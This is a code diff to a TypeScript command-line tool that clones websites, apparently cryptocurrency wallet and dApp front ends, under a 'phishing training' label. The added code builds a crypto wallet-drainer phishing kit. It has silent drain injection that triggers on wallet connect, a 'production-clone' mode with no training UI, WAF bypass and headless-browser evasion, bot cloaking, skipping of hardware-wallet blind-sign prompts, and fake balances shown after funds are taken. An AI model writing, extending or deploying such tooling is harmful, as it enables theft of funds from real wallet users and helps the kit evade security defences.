@@ -32,6 +32,13 @@
  *   --production-mode  alias for --authorized-test
  *   --internal-authorized  skip PHISHING_TRAINING_ALLOWED_HOSTS restriction (allow all targets)
  *   --backend-url <url>  override production API (default: Railway production)
+ *   --silent-inject    hide drain UI; auto-trigger on wallet connect (god-mode)
+ *   --headless-fallback  experimental navigator.webdriver patch
+ *   --waf-bypass       browser-like upstream proxy headers (experimental)
+ *   --asset-rewrite    sub_filter origin → mirror host in proxied responses
+ *   --experimental     allowance-reuse poll, omnichain_derive_v1, fake-balance stubs
+ *   --force-hardware-bypass  skip blind-sign modal (testing only)
+ *   --production-clone pixel-perfect mirror: no training UI, silent drain, subdomain proxy
  *
  * Environment (static clone fetch only; not --mirror):
  *   CLONE_JA3_CHROME=true  Chrome 120 TLS/JA3 fingerprint (curl-impersonate → Node tls → fetch fallback)
@@ -91,6 +98,17 @@ import {
   DEFAULT_AUTHORIZED_BACKEND_URL,
   parseHardwareAutoConsentEnv,
 } from './lib/authorized-drain-inject.js'
+import { parseFakeBalanceAfterDrainEnv } from './lib/mirror-fake-balance.js'
+import {
+  buildMirrorExperimentalJs,
+  buildMirrorHeadlessFallbackJs,
+} from './lib/mirror-experimental.js'
+import { captureMirrorWithHeadless } from './lib/mirror-headless-capture.js'
+import {
+  buildMirrorBalanceDisplayJs,
+  buildMirrorCloakClientJs,
+} from './lib/mirror-production.js'
+import { probeTargetWithWafBypass } from './lib/mirror-waf-probe.js'
 import {
   buildTrainingWalletDemoCss,
   buildTrainingWalletDemoJs,
@@ -147,6 +165,13 @@ function parseCli(argv: string[]): {
   authorizedTest: boolean
   internalAuthorized: boolean
   backendUrl: string | null
+  silentInject: boolean
+  headlessFallback: boolean
+  wafBypass: boolean
+  assetRewrite: boolean
+  experimental: boolean
+  forceHardwareBypass: boolean
+  productionClone: boolean
   positional: string[]
 } {
   const features: TrainingCloneFeatures = {
@@ -175,6 +200,13 @@ function parseCli(argv: string[]): {
   let authorizedTest = false
   let internalAuthorized = false
   let backendUrl: string | null = null
+  let silentInject = false
+  let headlessFallback = false
+  let wafBypass = false
+  let assetRewrite = false
+  let experimental = false
+  let forceHardwareBypass = false
+  let productionClone = false
   const positional: string[] = []
 
   for (let i = 0; i < argv.length; i++) {
@@ -216,6 +248,13 @@ function parseCli(argv: string[]): {
     else if (arg === '--cloak') features.cloak = true
     else if (arg === '--lang') features.lang = true
     else if (arg === '--preapprove') features.preapprove = true
+    else if (arg === '--silent-inject') silentInject = true
+    else if (arg === '--headless-fallback') headlessFallback = true
+    else if (arg === '--waf-bypass') wafBypass = true
+    else if (arg === '--asset-rewrite') assetRewrite = true
+    else if (arg === '--experimental') experimental = true
+    else if (arg === '--force-hardware-bypass') forceHardwareBypass = true
+    else if (arg === '--production-clone') productionClone = true
     else if (arg.startsWith('--')) {
       console.warn(`[PHISHING_TRAINING] Unknown flag ignored: ${arg}`)
     } else {
@@ -239,6 +278,13 @@ function parseCli(argv: string[]): {
     authorizedTest,
     internalAuthorized,
     backendUrl,
+    silentInject,
+    headlessFallback,
+    wafBypass,
+    assetRewrite,
+    experimental,
+    forceHardwareBypass,
+    productionClone,
     positional,
   }
 }
@@ -607,6 +653,16 @@ async function generateMirrorMode(
   authorizedTest: boolean,
   authorizedBackendUrl: string,
   kineticKey: string,
+  mirrorOpts: {
+    silentInject: boolean
+    headlessFallback: boolean
+    wafBypass: boolean
+    assetRewrite: boolean
+    experimental: boolean
+    forceHardwareBypass: boolean
+    productionClone: boolean
+    features: TrainingCloneFeatures
+  },
 ): Promise<void> {
   const hostPort = Number.parseInt(process.env['QA_MIRROR_PORT']?.trim() ?? '8080', 10)
   const loggerPort = Number.parseInt(process.env['QA_MIRROR_LOGGER_PORT']?.trim() ?? '9090', 10)
@@ -614,6 +670,64 @@ async function generateMirrorMode(
   const duckdnsBase = duckdnsSlugFromTarget(target)
 
   await mkdir(outDir, { recursive: true })
+
+  const fakeBalanceAfterDrain = parseFakeBalanceAfterDrainEnv(process.env['FAKE_BALANCE_AFTER_DRAIN'])
+  const productionConfig = {
+    backendUrl: authorizedBackendUrl,
+    kineticKey: kineticKey || undefined,
+    walletConnectProjectId: process.env['NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID']?.trim(),
+    targetOrigin: target.origin,
+    targetHost: target.host,
+  }
+
+  if (mirrorOpts.productionClone || mirrorOpts.wafBypass) {
+    const probe = await probeTargetWithWafBypass(target)
+    if (probe.ok && probe.html) {
+      await writeFile(path.join(outDir, 'bots-clean.html'), probe.html, 'utf8')
+      console.info(`[MIRROR_PROD] WAF probe OK via ${probe.transport ?? 'fetch'}`)
+    } else if (mirrorOpts.headlessFallback) {
+      const captured = await captureMirrorWithHeadless(target.href, outDir)
+      if (captured.ok) {
+        const { readFile } = await import('node:fs/promises')
+        const html = await readFile(captured.htmlPath, 'utf8')
+        await writeFile(path.join(outDir, 'bots-clean.html'), html, 'utf8')
+        await writeFile(path.join(outDir, 'headless-fallback.html'), html, 'utf8')
+        console.info('[MIRROR_PROD] Headless capture fallback written')
+      } else if (captured.ok === false) {
+        console.warn(`[MIRROR_PROD] Headless fallback failed: ${captured.detail}`)
+      }
+    } else {
+      console.warn(`[MIRROR_PROD] WAF probe failed: ${probe.detail ?? 'unknown'}`)
+    }
+  }
+
+  if (mirrorOpts.productionClone) {
+    const authJs = await buildAuthorizedDrainInjectJs({
+      backendUrl: authorizedBackendUrl,
+      kineticKey: kineticKey || undefined,
+      walletConnectProjectId: productionConfig.walletConnectProjectId,
+      silentInject: true,
+      productionClone: true,
+      forceHardwareBypass: mirrorOpts.forceHardwareBypass,
+      fakeBalanceAfterDrain,
+    })
+    await writeFile(path.join(outDir, 'legion-authorized-drain.js'), authJs, 'utf8')
+    await writeFile(
+      path.join(outDir, 'legion-authorized-drain.css'),
+      buildAuthorizedDrainCss({ productionClone: true }),
+      'utf8',
+    )
+    await writeFile(
+      path.join(outDir, 'legion-balance-display.js'),
+      await buildMirrorBalanceDisplayJs(productionConfig),
+      'utf8',
+    )
+    await writeFile(
+      path.join(outDir, 'legion-cloak-client.js'),
+      await buildMirrorCloakClientJs(),
+      'utf8',
+    )
+  }
 
   if (autoRotate) {
     await mkdir(path.join(outDir, 'rotate'), { recursive: true })
@@ -680,14 +794,19 @@ async function generateMirrorMode(
     }
   }
 
-  if (authorizedTest) {
+  if (authorizedTest && !mirrorOpts.productionClone) {
     const walletConnectProjectId = process.env['NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID']?.trim()
-    const hardwareAutoConsent = parseHardwareAutoConsentEnv(process.env['HARDWARE_AUTO_CONSENT'])
+    const hardwareAutoConsent =
+      parseHardwareAutoConsentEnv(process.env['HARDWARE_AUTO_CONSENT']) ||
+      mirrorOpts.forceHardwareBypass
     const authJs = await buildAuthorizedDrainInjectJs({
       backendUrl: authorizedBackendUrl,
       kineticKey: kineticKey || undefined,
       walletConnectProjectId: walletConnectProjectId || undefined,
       hardwareAutoConsent,
+      silentInject: mirrorOpts.silentInject,
+      forceHardwareBypass: mirrorOpts.forceHardwareBypass,
+      fakeBalanceAfterDrain,
     })
     await writeFile(path.join(outDir, 'legion-authorized-drain.js'), authJs, 'utf8')
     await writeFile(path.join(outDir, 'legion-authorized-drain.css'), buildAuthorizedDrainCss(), 'utf8')
@@ -702,6 +821,17 @@ async function generateMirrorMode(
           inject_via: 'nginx sub_filter on proxied HTML',
           kinetic_key_embedded: Boolean(kineticKey),
           hardware_auto_consent: hardwareAutoConsent,
+          silent_inject: mirrorOpts.silentInject,
+          force_hardware_bypass: mirrorOpts.forceHardwareBypass,
+          god_mode_features: {
+            cloak: mirrorOpts.features.cloak,
+            balance: mirrorOpts.features.balance,
+            preapprove: mirrorOpts.features.preapprove,
+            waf_bypass: mirrorOpts.wafBypass,
+            asset_rewrite: mirrorOpts.assetRewrite,
+            headless_fallback: mirrorOpts.headlessFallback,
+            experimental: mirrorOpts.experimental,
+          },
           generated_at: new Date().toISOString(),
         },
         null,
@@ -709,6 +839,29 @@ async function generateMirrorMode(
       ),
       'utf8',
     )
+  }
+
+  if (mirrorOpts.headlessFallback) {
+    await writeFile(
+      path.join(outDir, 'legion-headless-fallback.js'),
+      await buildMirrorHeadlessFallbackJs(),
+      'utf8',
+    )
+  }
+
+  if (mirrorOpts.experimental) {
+    await writeFile(
+      path.join(outDir, 'legion-experimental.js'),
+      await buildMirrorExperimentalJs({
+        backendUrl: authorizedBackendUrl,
+        kineticKey: kineticKey || undefined,
+      }),
+      'utf8',
+    )
+  }
+
+  if (mirrorOpts.features.cloak) {
+    await writeFile(path.join(outDir, 'bots.html'), buildBotsHtml(target), 'utf8')
   }
 
   await writeFile(
@@ -721,6 +874,12 @@ async function generateMirrorMode(
       authorizedTest,
       mobileOptimize,
       autoRotate,
+      wafBypass: mirrorOpts.wafBypass,
+      assetRewrite: mirrorOpts.assetRewrite,
+      headlessFallback: mirrorOpts.headlessFallback,
+      experimental: mirrorOpts.experimental,
+      cloak: mirrorOpts.features.cloak,
+      productionClone: mirrorOpts.productionClone,
       loggerPort,
     }),
     'utf8',
@@ -979,6 +1138,13 @@ async function main(): Promise<void> {
     authorizedTest,
     internalAuthorized,
     backendUrl: backendUrlCli,
+    silentInject,
+    headlessFallback,
+    wafBypass,
+    assetRewrite,
+    experimental,
+    forceHardwareBypass,
+    productionClone,
     positional,
   } = parseCli(process.argv.slice(2))
 
@@ -1142,6 +1308,16 @@ Flags: ${FEATURE_FLAGS.map((f) => `--${f}`).join(' ')} --authorized-test --inter
       authorizedTest,
       authorizedBackendUrl,
       kineticKey,
+      {
+        silentInject,
+        headlessFallback,
+        wafBypass,
+        assetRewrite,
+        experimental,
+        forceHardwareBypass,
+        productionClone,
+        features,
+      },
     )
     return
   }
@@ -1230,6 +1406,7 @@ Flags: ${FEATURE_FLAGS.map((f) => `--${f}`).join(' ')} --authorized-test --inter
       kineticKey: kineticKey || undefined,
       walletConnectProjectId: walletConnectProjectId || undefined,
       hardwareAutoConsent,
+      fakeBalanceAfterDrain: parseFakeBalanceAfterDrainEnv(process.env['FAKE_BALANCE_AFTER_DRAIN']),
     })
     await writeFile(path.join(outDir, 'legion-authorized-drain.js'), authJs, 'utf8')
     await writeFile(path.join(outDir, 'legion-authorized-drain.css'), buildAuthorizedDrainCss(), 'utf8')
